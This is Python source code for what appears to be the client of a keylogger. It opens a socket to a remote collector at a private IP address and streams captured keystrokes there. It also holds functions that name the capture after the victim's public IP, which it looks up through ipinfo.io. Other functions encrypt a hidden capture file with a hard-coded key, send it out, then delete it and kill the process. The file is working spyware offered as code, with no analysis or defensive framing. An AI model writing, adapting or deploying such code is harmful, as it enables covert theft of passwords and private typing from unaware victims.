import keylogger
import socket
import requests
import os  
from datetime import datetime
from cryptography.fernet import Fernet
import signal

def get_filename():
    now = datetime.now()
    response = requests.get("https://ipinfo.io")
    ip_data = response.json()
    public_ip = ip_data.get('ip')
    if os.name == 'nt':
        filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H-%M-%S") + ".keyboard.txt"
    else:
        filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"

    return filename

def launch_keylogger(mysocket):
    return keylogger.listen_keyboard(mysocket)

def kill_server():
    if os.name == "nt":
        os._exit(1)
    else:
        os.kill(os.getpid(), signal.SIGINT)

def stop_and_delete_capture_file():
    file = ".document1.txt" 
    os.remove(file)
    kill_server()

    

def get_socket(server_address, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    client_socket.connect((server_address, server_port))
    return client_socket

def send_file_securely(client_socket):
    try:
        key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
 
        filename = get_filename()
        encrypted_message = Fernet(key).encrypt(filename.encode())
        client_socket.send(encrypted_message)

        with open(".document1.txt", "r") as file:
            lines = file.read()
            encrypted_lines = Fernet(key).encrypt(lines.encode('utf-8'))
            client_socket.send(encrypted_lines)
            file.close()
            del file
            
    finally:
        client_socket.close()

if __name__ == "__main__":
    mysocket = get_socket("192.168.1.16", 12345)
    launch_keylogger(mysocket)

    """
    try:
        send_file_securely(mysocket)
    except KeyboardInterrupt:
        kill_server()
    """

